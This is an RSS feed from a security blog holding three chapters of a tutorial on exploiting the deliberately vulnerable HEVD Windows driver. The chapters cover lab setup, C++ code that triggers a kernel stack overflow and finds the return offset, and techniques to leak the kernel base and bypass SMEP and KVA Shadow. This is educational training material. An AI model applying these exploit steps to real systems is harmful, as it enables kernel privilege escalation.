<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Cebola Security</title>
		<link>https://mdanilor.github.io/posts/</link>
		<description>Recent content in Posts on Cebola Security</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Tue, 29 Nov 2022 00:00:00 -0300</lastBuildDate>
		<atom:link href="https://mdanilor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>[Cracking Windows Kernel with HEVD] Chapter 2: Is there a way to bypass kASLR, SMEP and KVA Shadow?</title>
			<link>https://mdanilor.github.io/posts/hevd-2/</link>
			<pubDate>Tue, 29 Nov 2022 00:00:00 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/hevd-2/</guid>
			<description>##Cracking HackSys Extreme Vulnerable Driver: Is there a way to bypass kASLR, SMEP and KVA Shadow?
Where to redirect the execution flow? On the previous post, we wrote a program that would crash our driver and leave us with a BSOD. We managed to discover the return address offset and redirect the program flow to an arbitrary address. But we were left with a question: what now? Where to redirect the execution flow?</description>
			<content type="html"><![CDATA[<p>##Cracking HackSys Extreme Vulnerable Driver: Is there a way to bypass kASLR, SMEP and KVA Shadow?</p>
<h3 id="where-to-redirect-the-execution-flow">Where to redirect the execution flow?</h3>
<p>On the <a href="/posts/hevd-1">previous post</a>, we wrote a program that would crash our driver and leave us with a BSOD. We managed to discover the return address offset and redirect the program flow to an arbitrary address. But we were left with a question: what now? Where to redirect the execution flow?</p>
<p>The first naive approach that would come to mind is to create a userland function in our exploit and redirect the control flow to that function. This approach was fine until Windows 7 SP1 launched (I believe it was on Windows 7 SPI, but I might be mistaken on this one. Could not find sources on the Internet to back this up). However, from this point onwards Supervisor Mode Execution Prevention was enabled in processor which has support for it.</p>
<h4 id="wtf-is-supervisor-mode-execition-prevention">WTF is Supervisor Mode Execition Prevention?</h4>
<p>Ok, but first what is supervisor mode anyways?</p>
<p><a href="https://en.wikipedia.org/wiki/Protection_ring#SUPERVISOR-MODE">Supervisor mode</a> is an execution mode which enables all instructions, including privileged ones. It gives access to different address spaces, memory management hardware and other peripherals. This is the mode in which the kernel, and its drivers, run. It is basically a &ldquo;god mode&rdquo; in which the kernel runs, but not userland programs.</p>
<p>So the Supervisor Mode Execution Prevention is a mitigation that will not permit certain regions of memory (such as userland memory) to be executed in supervisor mode. In terms of our exploit, if we redirect the execution flow to our program in userland, it will raise a trap and you will immediately get a BSOD.</p>
<p>This mitigation can be disabled (almost trivially on Windows, if I might say so) by setting the 20th bit of CR4 register to zero. This can be achieved in kernel land with a ROP chain. In this case, we can bypass SMEP by using a ROP chain, for instance.</p>
<p>We can also bypass SMEP by never going to userland in the first place. We can use ROP gadgets in the kernel to perform elevation of privileges or write our shellcode to a memory region in the kernel which is both executable and writable. This approach is usually harder than the former.</p>
<p>In this case, we should go with the easier approach and ROP our way to disable the SMEP bit on the CR4 register, right?</p>
<p>Well, we could try. But nowadays there is another mitigation in place that will make this bypass useless.</p>
<h4 id="smep-was-our-only-hope-no-there-is-another">SMEP was our only hope. No, there is another.</h4>
<p><img src="/posts/kernel2-img/14-yoda.png" alt="">
There is another mitigation called Kernel Page-Table Isolation (KPTI), or, as Windows calls it, Kernel Virtual Address (KVA) Shadow. It was actually created to mitigate Meltdown vulnerabilities by isolating kernel page tables from user page tables. However, it also creates another problem: when executing kernel code, it marks user page tables as non-executable (NX). This breaks down our easy approach to just disable SMEP by ropping.</p>
<p>Now we can either mark user pages as executable again or use a writable and executable kernel page to store our shellcode. The latter approach will be used here.</p>
<p>With this approach, we don&rsquo;t have to be concerned about SMEP at all, as we will just avoid it. But this raises yet another question: is there such a place in kernel where we can write our shellcode and execute it?</p>
<h4 id="allocating-an-executable-pool">Allocating an executable pool</h4>
<p>Driver developers can allocate different types of memory pools. The two most basic types are PagedPool and NonPagedPool types. The former allocated a non-executable pageable memory pool for use, whereas the latter allocates non-pageable pool which, by default, is executable. The allocation can be performed by calling <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag">ExAllocatePoolWithTag()</a> function with the desired parameters.</p>
<p>We shall use this function to allocate an executable NonPagedPool. Then we write our shellcode to this allocated region and execute it. Finally, we restore enough registers so the system can return to userland gracefully and that&rsquo;s a wrap.</p>
<p>The <code>ExAllocatePoolWithTag()</code> has the following prototype:</p>
<pre><code>PVOID ExAllocatePoolWithTag(
  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
  [in] SIZE_T                                         NumberOfBytes,
  [in] ULONG                                          Tag
);
</code></pre><p>The first parameter is the pool type, which is zero (NonPagedPool), as can be checked in the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">official Microsoft documentation</a>. The second parameter is the size, which we can just use 4096 bytes. Finally, the Tag parameter is just for debugging purposes. We can put whatever we want in it.</p>
<p>It will return the address of the allocated pool.</p>
<p>According to <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft documentation</a>, the call convention dictates that the first parameter is given in <code>rcx</code> register, the second in <code>rdx</code> and the third in <code>r8</code>. We shall ROP our way to set up <code>rcx</code> to zero, <code>rdx</code> to 4096 and call this function. The address allocated will be returned in <code>rax</code> register, as it is also dictated by the call convention.</p>
<p>After it is allocated, we can use <code>RtlCopyMemory</code> to copy our shellcode from userland to the executable address in the kernel land. Finally, we can use some gadget, such as <code>jmp rax</code> to redirect the execution flow.</p>
<p>Once again, this approach raises another problem. We must have the address of <code>ExAllocatePoolWithTag</code> and <code>RtlCopyMemory</code> (or an analogue memory copy function) to know where to redirect our flow. We could get the address for these functions in ntoskrnl.exe (which is actually the kernel binary), but the imagebase is changed upon each reboot. This means that on every reboot, every kernel function will be added to an offset, the imagebase offset, making the addresses unpredictable. Our approach will rely on getting the addresses for the desired functions (and eventual gadgets) in the ntoskrnl.exe binary and somehow leak the imagebase address to defeat the protection.</p>
<h4 id="defeating-the-randomized-imagebase">Defeating the randomized imagebase</h4>
<p>This sounds like a really hard problem to solve that would rely on leaking a kernel address and then try to guess the imagebase with that. And this problem is usually hard to solve. But Windows makes it easier for us!</p>
<p>For processes running with medium integrity level (which is the default level when you open applications), there are Windows APIs which will give that away for free. Microsoft even gives us <a href="https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-device-drivers-in-the-system">an example</a> of how to implement this.</p>
<p>The <code>EnumDeviceDrivers</code> function, present on <code>psapi.h</code>, will enumerate all device drivers, including the kernel itself, and give us the base address for the device driver. It will return a list of device drivers, the first of which being the kernel itself. The implementation is very simple:</p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;
...
unsigned long long get_kernel_base_addr() {
	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);

	return (unsigned long long)drivers[0];
}

</code></pre><p>There we go! The randomized imagebase is now defeated.</p>
<p>It is also useful to be able to get any kernel function address by the function name. This is done by opening the kernel binary as a library and looking up the address for the desired symbol. The implementation is very straightforward as well:</p>
<pre><code>PVOID get_kernel_symbol_addr(const char *symbol) {
	PVOID kernelBaseAddr;
	HMODULE userKernelHandle;
	PCHAR functionAddress;
	unsigned long long offset;

	kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Get base address from our previously implemented function
	userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // Loads the kernel binary as a lib

	if (userKernelHandle == INVALID_HANDLE_VALUE) {
		// Something went wrong
		return NULL;
	}

	functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Finds the address of the specified symbol
	if (functionAddress == NULL) {
		// Something went wrong
		return NULL;
	}

	offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the address found for the symbol to the base address of the lib loaded in the process memory
	return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset of the leaked kernel base address
}
</code></pre><p>With the function above, we can query the address of any kernel function. Neat!</p>
<p>I am afraid that is as far as we are going to get today, folks. On the next post we will craft our ROP payload. See you then!</p>
]]></content>
		</item>
		
		<item>
			<title>[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?</title>
			<link>https://mdanilor.github.io/posts/hevd-1/</link>
			<pubDate>Sun, 11 Sep 2022 00:00:50 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/hevd-1/</guid>
			<description>Cracking HackSys Extreme Vulnerable Driver: will this driver ever crash? Writing a BSOD crash Last time we focused on setting up the environment. This time we will try to understand the vulnerability and make our system crash! Let&amp;rsquo;s dive in!
The vulnerable code (...) ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; (...) // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR)); DbgPrint(&amp;quot;[+] UserBuffer: 0x%p\n&amp;quot;, UserBuffer); DbgPrint(&amp;quot;[+] UserBuffer Size: 0x%zX\n&amp;quot;, Size); DbgPrint(&amp;quot;[+] KernelBuffer: 0x%p\n&amp;quot;, &amp;amp;KernelBuffer); DbgPrint(&amp;quot;[+] KernelBuffer Size: 0x%zX\n&amp;quot;, sizeof(KernelBuffer)); (.</description>
			<content type="html"><![CDATA[<h2 id="cracking-hacksys-extreme-vulnerable-driver-will-this-driver-ever-crash">Cracking HackSys Extreme Vulnerable Driver: will this driver ever crash?</h2>
<h3 id="writing-a-bsod-crash">Writing a BSOD crash</h3>
<p><a href="/posts/hevd-0/">Last time</a> we focused on setting up the environment. This time we will try to understand the vulnerability and make our system crash! Let&rsquo;s dive in!</p>
<h4 id="the-vulnerable-code">The vulnerable code</h4>
<pre><code>(...)
    	ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
(...)
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);
        DbgPrint(&quot;[+] UserBuffer Size: 0x%zX\n&quot;, Size);
        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;KernelBuffer);
        DbgPrint(&quot;[+] KernelBuffer Size: 0x%zX\n&quot;, sizeof(KernelBuffer));

(...)

        DbgPrint(&quot;[+] Triggering Buffer Overflow in Stack\n&quot;);

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
(...)
</code></pre><p>The comments pretty much explain the whole code. The issue arises on <code>RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</code>, as it copies <code>Size</code> bytes, where <code>Size</code> is a user-defined length, from a user buffer to a kernel buffer of size <code>BUFFER_SIZE</code>. <code>BUFFER_SIZE</code> is defined in <code>Common.h</code> as 512. ULONG is 4 bytes long, thus <code>KernelBuffer</code> size is 2048 bytes. If the user sends a buffer larger than 2048, it will overflow.</p>
<p>If you are new to stack overflow vulnerabilities, you might be asking yourself &ldquo;but how does a stack overflow can turn into elevation of privileges or arbitrary code execution?&quot;. That is a very valid concern and I will not go in depth here, as I have already explained in a previous post. You can read about it <a href="https://mdanilor.github.io/posts/hello-kernel/#the-stack">here</a>.</p>
<h4 id="lets-write-some-code">Let&rsquo;s write some code</h4>
<p>Fire up your Visual Studio and create an empty C++ project.</p>
<p>First thing we have to do is find a way to communicate with our device driver. Device drivers can be accessed through Input Output Control (IOCTL), in which a userland application may call for functions implemented by the driver. Each IOCTL function implemented by the driver is assigned to a numeric identificator. Moreover, HEVD implements one IOCTL function for each vulnerability. This means that we have to know which IOCTL function number to &ldquo;call&rdquo; and reach the stack overflow vulnerability. For that, we can check the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h">code</a> out:</p>
<pre><code>(...)

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
(...)
</code></pre><p>As we can see, the buffer overflow stack is IOCTL function number 0x800.</p>
<p>To use the IOCTL and call the buffer overflow stack function, we must get the handle for the device driver. Windows&rsquo; CreateFileA function, besides creating new files, opens handles for devices. Check the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN">doc page</a> for further information.</p>
<p>So first let&rsquo;s write a function that gets the handle for the device:</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;

#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // Gets the IOCTL number from the function number
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)

using namespace std;

HANDLE get_handle() {
	HANDLE h = CreateFileA(DEVICE_NAME,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (h == INVALID_HANDLE_VALUE) {
		printf(&quot;Failed to get handle =(\n&quot;);
		return NULL;
	}
	return h;
}
</code></pre><p>The <code>get_handle()</code> function gets the handle (duh) to the device and returns it, in case of success. It calls CreateFileA function to do that, which parameters are covered below:</p>
<ul>
<li>File name - <code>DEVICE_NAME</code>: this is the name of the device to get the handle. The device name is <code>\\.\HackSysExtremeVulnerableDriver</code>, which is described in the driver source code. These weird extra <code>\</code> occur to correctly and safely convert to type <code>LPCSTR</code>, accepted by <code>CreateFileA()</code> function.</li>
<li>Desired access - <code>FILE_READ_ACCESS | FILE_WRITE_ACCESS</code>: define which types of access we desire upon manipulating this file. It can be read, write or both, basically. Here we have chosen both.</li>
<li>Shared mode - <code>FILE_SHARE_READ | FILE_SHARE_WRITE</code>: allows or disallows the file to be opened by other applications. In this case, we do not care too much about this right now. However, in specific scenarios, such as race condition, we might need to get more than one handle to the device.</li>
<li>Security Attributes - <code>NULL</code>: this optional parameter regards to a few security attributes on the moment of opening the file. It is mostly used to allow handles to be inherited to other processes. In this case, we do not care about that.</li>
<li>Creation disposition - <code>OPEN_EXISTING</code>: action to take when the desired file does not exist. With <code>OPEN_EXISTING</code>, it will raise an error should if the file does not exist. It is usual to use this when working with device drivers.</li>
<li>Flags and attributes - <code>FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL</code>: as the name states, flags and attributes when opening this file. In this case, we are signaling that the file will be used for asynchronous IO.</li>
<li>Template file - <code>NULL</code>: ignored when opening an existing file, so NULL here.</li>
</ul>
<p>We create and use the <code>IOCTL</code> macro, which utilizes <code>CTL_CODE</code> macro. This macro will not be explained here, but you can read the official documentation <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">here</a>.</p>
<p>Now we can do IOCTL just by calling <code>DeviceIoControl()</code> function. I will create a simple <code>do_buffer_overflow()</code> function now that will call the IOCTL sending a 0x1000 byte long buffer that will surely overflow the driver and we&rsquo;ll go on from that.</p>
<pre><code>void do_buffer_overflow(HANDLE h)
{
	SIZE_T in_buffer_size = 0x1000;
	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
	memset((char *)in_buffer, 'A', in_buffer_size);
	printf(&quot;Sending buffer.\n&quot;);
	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
	if (!result)
	{
		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
	}
	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
}
</code></pre><p>What this does is allocate a buffer of size 0x1000 (4096) bytes, which overflows the 2048 byte-long KernelBuffer. Wrapping it up, this is our code:</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;

#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)

using namespace std;


HANDLE get_handle() {
	HANDLE h = CreateFileA(DEVICE_NAME,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (h == INVALID_HANDLE_VALUE) {
		printf(&quot;Failed to get handle =(\n&quot;);
		return NULL;
	}
	return h;
}

void do_buffer_overflow(HANDLE h)
{
	SIZE_T in_buffer_size = 0x1000;
	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
	memset((char *)in_buffer, 'A', in_buffer_size);
	printf(&quot;Sending buffer.\n&quot;);
	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
	if (!result)
	{
		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
	}
	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
}

int main()
{
	do_buffer_overflow(get_handle());
	system(&quot;pause&quot;);
}
</code></pre><p>Now let&rsquo;s put a breakpoint in HEVD function <code>TriggerBufferOverflowStack()</code> and run the exploit. Follow the steps below:</p>
<ul>
<li>Pause the execution on WinDbg.</li>
<li>On the Command window, find the function by typing <code>x HEVD!TriggerBufferOverflowStack</code>. Click on the function.</li>
<li>Click the link to the source code. The disassembly of the function will open in the Disassembly window.
<img src="/posts/kernel2-img/7-breakpoint1.png" alt=""></li>
<li>Navigate your way to the end of the function and put a breakpoint in the RET instruction. (Click the instruction and press F9 to insert a breakpoint)
<img src="/posts/kernel2-img/8-breakpoint2.png" alt=""></li>
<li>Resume execution (F5)</li>
<li>Run the exploit</li>
</ul>
<p>The breakpoint hits! Aw yeah!</p>
<p>I use the Memory window to check the stack out by puting <code>@rsp</code> in the &ldquo;Virtual&rdquo; and everything is &lsquo;A&rsquo;.</p>
<p><img src="/posts/kernel2-img/9-as.png" alt=""></p>
<p>If we continue, the machine crashes. Mission acomplished. Next step: overwrite the return address.</p>
<h3 id="execution-flow-hijack">Execution flow hijack</h3>
<p>We have already overwritten the return address to <code>AAAAAAAA</code>. Cool, but <code>0x4141414141414141</code> does not mean any valid address we can execute. We need to find out where exactly in our buffer the return address gets overwritten and replace it with a valid executable address. To which valid executable address we will redirect the execution will come up later on. What we need now is an offset.</p>
<p>There are two ways to determine the offset for the return address. One way is to analyze the assembly code with WinDBG. The other is to use <a href="https://github.com/ickerwx/pattern">pattern</a>.</p>
<h4 id="offset-discovery-with-windbg">Offset discovery with WinDBG</h4>
<p>This method is pretty straightforward. If we look at the assembly code of the epilogue of the <code>hevd!TriggerBufferOverflowStack</code> function on WinDBG, we get this:</p>
<p><img src="/posts/kernel2-img/10-functionepilogue.png" alt=""></p>
<p>As we can see, it pops 3 64-bit (8 bytes) registers before it calls RET. If we peek at the HEVD source code, we find out the buffer has 2048 bytes. 2048 + 3*8 = 2072 and that is our buffer size.</p>
<p>This method requires some extra manual evaluation and the visual inspection may be prone to human error, so there is a more assertive way shown next.</p>
<h4 id="offset-discovery-with-pattern">Offset discovery with pattern</h4>
<p>This approach is usually error free. First we use <a href="https://github.com/ickerwx/pattern">pattern</a> to create a pattern (duh) that will go in the buffer.</p>
<p><code>pattern.py create 2100</code> will generate a 2100 byte long pattern to our buffer. It should look like this:</p>
<p><img src="/posts/kernel2-img/11-patterncreate.png" alt=""></p>
<p>These weird characters will be used to find out the offset. We will send this pattern in our buffer and use the same tool to find out which offset of the pattern reached to the instruction pointer.</p>
<p>The code gets like this:</p>
<pre><code>void do_buffer_overflow(HANDLE h)
{
	SIZE_T in_buffer_size = 2100;
	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
	in_buffer = (PULONG) &quot;&lt;GENERATED_PATTERN_HERE&gt;&quot;
	
	printf(&quot;Sending buffer.\n&quot;);
	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
	if (!result)
	{
		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
	}
	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
}
</code></pre><p>Now set up a breakpoint in <code>hevd!TriggerBufferOverflowStack</code>'s <code>ret</code> instruction and let us see the results.</p>
<p>As soon as the breakpoint hits, which is just before the <code>ret</code> instruction executes, we peek at the memory (make sure to set up display format as ASCII) and check the top of the stack out:</p>
<p><img src="/posts/kernel2-img/12-patterninstack.png" alt=""></p>
<p>In my case, I have <code>0Cr1</code> at the top of my stack. So I&rsquo;ll run <a href="https://github.com/ickerwx/pattern">pattern</a>: <code>pattern.py offset 0Cr1 2100</code>, where <code>0Cr1</code> is the pattern for which I want the offset and 2100 is the size of the generated buffer. And the result is 2072:</p>
<p><img src="/posts/kernel2-img/13-patteroffset.png" alt=""></p>
<p>That way, we must put the return address in the position 2072 of our payload. This will redirect the execution flow to whatever address we put in this position. But this raises the next question: where do we redirect the execution flow to? Unfortunately, this question will be answered on the next part! See you then!</p>
]]></content>
		</item>
		
		<item>
			<title>[Cracking Windows Kernel with HEVD] Chapter 0: Where do I start?</title>
			<link>https://mdanilor.github.io/posts/hevd-0/</link>
			<pubDate>Mon, 29 Aug 2022 13:08:50 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/hevd-0/</guid>
			<description>Cracking HackSys Extreme Vulnerable Driver: where do I start? What is this? Hello! Previously we exploited vulnerable linux driver by invictus-0x90. If you missed, not to worry: this series is totally unrelated, since we&amp;rsquo;ll be exploiting the vulnerable Windows driver HEVD. However, if you are a curious one, make sure to check the other post!
Today we&amp;rsquo;ll be attacking HEVD: HackSys Extreme Vulnerable Driver. This Windows driver is intentionally vulnerable to many memory corruption vulnerabilities (stack overflow, int overflow, use after free, type confusion, to name a few).</description>
			<content type="html"><![CDATA[<h2 id="cracking-hacksys-extreme-vulnerable-driver-where-do-i-start">Cracking HackSys Extreme Vulnerable Driver: where do I start?</h2>
<h3 id="what-is-this">What is this?</h3>
<p>Hello! <a href="https://mdanilor.github.io/posts/hello-kernel/">Previously</a> we exploited <a href="https://github.com/invictus-0x90/vulnerable_linux_driver">vulnerable linux driver by invictus-0x90</a>. If you missed, not to worry: this series is totally unrelated, since we&rsquo;ll be exploiting the vulnerable <strong>Windows</strong> driver <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>. However, if you are a curious one, make sure to check the other post!</p>
<p>Today we&rsquo;ll be attacking HEVD: HackSys Extreme Vulnerable Driver. This Windows driver is intentionally vulnerable to many memory corruption vulnerabilities (stack overflow, int overflow, use after free, type confusion, to name a few). We will exploit stack overflow to gain elevation of privileges in this post.</p>
<p>This exercise is a &ldquo;must do&rdquo; if you are starting on Windows kernel exploitation. I would like to thank Payatu and HackSys for developing this extremely useful learning tool.</p>
<p>Many people over the Internet have already solved it and posted writeups (probably way better than mine). However, most writeups I have read lack details on bypassing SMEP and KPTI. This part will be explained in depth here. Another rare, if not unique, feature of this post will be our sysret approach with KPTI.</p>
<p>I warn you this post will be long and slow-paced, good for people who has experience with memory corruption vulnerabilities but are getting started in kernel hacking. It will also go in depth on advanced topics, such as kernel security mitigation bypasses, KPTI bypass and sysret. I have divided in 5 chapters to be released every other week:</p>
<ul>
<li>Chapter 0: Where do I start?</li>
<li><a href="/posts/hevd-1">Chapter 1: Will this driver ever crash?</a></li>
<li><a href="/posts/hevd-2">Chapter 2: Is there a way to bypass kASLR, SMEP and KVA Shadow?</a></li>
<li><a href="/posts/hevd-3">Chapter 3: Can we rop our way into triggering our shellcode?</a></li>
<li>Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?</li>
</ul>
<p>Before we move on, I would like to thank a few friends, as I have not solved challenge by myself. Instead, it was an effort by me and my friends Viniboy, Giuliano and Psylinux through extensive Jitsi calls, a few frustration moments and a lot of joy at the end! Although we had some experience in Windows userland exploitation and Linux kernel exploitation, we did not know anything on Windows kernel exploitation. It has been quite a journey!</p>
<p>Finally, I would also like to send my appreciation to <a href="https://sidi.org.br">SiDi</a>, my employer, for giving us the time and resources to study this topic.</p>
<p>Now let&rsquo;s get started.</p>
<h3 id="setting-up-the-environment">Setting up the environment</h3>
<p>The environment setup is a little tricky. For some reason unknown to me (if you know why this happens, please send me an email), VirtualBox does not have SMEP support (if you don&rsquo;t know what SMEP is, just ignore the last sentence! I will go in depth about SMEP throughout this blog post, but for now just know it is a memory protection). Without SMEP, we miss half the fun. I recommend the latest Hyper-V or VMWare for this, since both support this protection. I will be using Hyper-V in this post, since it has a better performance for kernel debugging. Be advised that VMWare will most certainly have performance issues when debugging Windows kernel.</p>
<p>First, download Windows 10 for Hyper-V or VMWare from <a href="https://developer.microsoft.com/pt-br/microsoft-edge/tools/vms/">the official Microsoft website</a>. You should also have a Windows host. If you don&rsquo;t have a Windows host, you can virtualize it aswell.</p>
<p>The setup we&rsquo;ll organize here is basically this:</p>
<pre><code>┌───────────────────────────┐
│                           │
│                           │
│Windows 10 host (Debugger) │
│                           │
│                           │
└─────────────▲─────────────┘
              │
  Attached to debugger on
              │
              │
┌─────────────┴─────────────┐
│                           │
│                           │
│  Windows 10 VM (Debuggee) │
│                           │
│                           │
└───────────────────────────┘
</code></pre><p>We have a Windows 10 VM (the one we just downloaded) which kernel we will attach to WinDbg debugger on our host. Pretty simple!</p>
<p>Once you have downloaded the Windows VM, start it up on VMWare or Hyper-V. Open <code>cmd</code> as administrator and put the following:</p>
<pre><code>bcdedit /debug on
bcdedit /dbgsettings net hostip:&lt;HOST IP ADDR HERE&gt; port:50000
</code></pre><p>A key will be given. Copy this key to your host.</p>
<p><img src="/posts/kernel2-img/0-bcdedit.png" alt=""></p>
<p>We should be able to attach a debugger now using this given key. Download <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/">Windows SDK from the official Microsoft site</a> to your host. We&rsquo;ll use Microsoft&rsquo;s debugger WinDbg, which comes in this SDK.</p>
<p>Open WinDbg on your host, go to file -&gt; kernel debugging. Leave the port number as 50000 and paste the key you copied from your guest (debuggee). Hit OK and reboot your guest.</p>
<p><img src="/posts/kernel2-img/1-windbg-kernel-debugging.png" alt=""></p>
<p>Once you have rebooted your VM, it should have been attached to the debugger. We will pause the execution to make sure everything is allright. If you are on Hyper-V on advanced mode, it will drop your connection until you restore execution (by pressing F5 on WinDbg).</p>
<p><img src="/posts/kernel2-img/2-paused.png" alt=""></p>
<p>I don&rsquo;t want to install Visual Studio in the debuggee machine, so I will create a shared folder between my host and VM to pass the exploit binary which I&rsquo;ll be building from my host machine. In addition, HEVD will also be sent through this shared folder. The way shared folders are created depend on whether you use VMWare or Hyper-V, so I&rsquo;ll ommit this part here.</p>
<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases/tag/v3.00">Download HEVD</a> to the debuggee machine and load it. This can be done by opening the command prompt as Administrator and executing the following:</p>
<pre><code>sc create HEVD binPath= &lt;Path to HEVD root folder&gt;\driver\vulnerable\x64\HEVD.sys type= kernel
sc start HEVD
</code></pre><p>If a debugger is not attached, it will prompt an error on starting the service, as follows:</p>
<p><img src="/posts/kernel2-img/3-error.png" alt=""></p>
<p>If that happens, just attach the debugger and run it again:</p>
<p><img src="/posts/kernel2-img/4-success.png" alt=""></p>
<p>We are almost all set at this to start writing the exploit. But first, let&rsquo;s tune up WinDbg. If you open it vanilla, it will be ugly and will show only the command line. On WinDbg go to view and enable Memory, Call Stack, Disassembly and Memory. Organize it as you wish. Mine looks like this:</p>
<p><img src="/posts/kernel2-img/5-mywindbg.png" alt=""></p>
<p>Finally, we&rsquo;ll enable DbgPrint messages on WinDbg by pausing and inputing the following command:</p>
<p><code>ed nt!Kd_IHVDRIVER_Mask 8</code></p>
<p>To validate that it works, stop and start HEVD. If you see the debug messages, everything is all set!</p>
<p><img src="/posts/kernel2-img/6-allset.png" alt=""></p>
<p>The environment is done! You may now debug your kernel. Try out a few experiments! Pause it. Put breakpoints. The sky is the limit.</p>
<p><a href="/posts/hevd-1">On the next part</a> we will analyze the vulnerable driver and start exploiting it. See you then!!</p>
]]></content>
		</item>
		
		<item>
			<title>Understanding binary protections (and how to bypass) with a dumb example</title>
			<link>https://mdanilor.github.io/posts/memory-protections/</link>
			<pubDate>Mon, 01 Feb 2021 17:30:00 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/memory-protections/</guid>
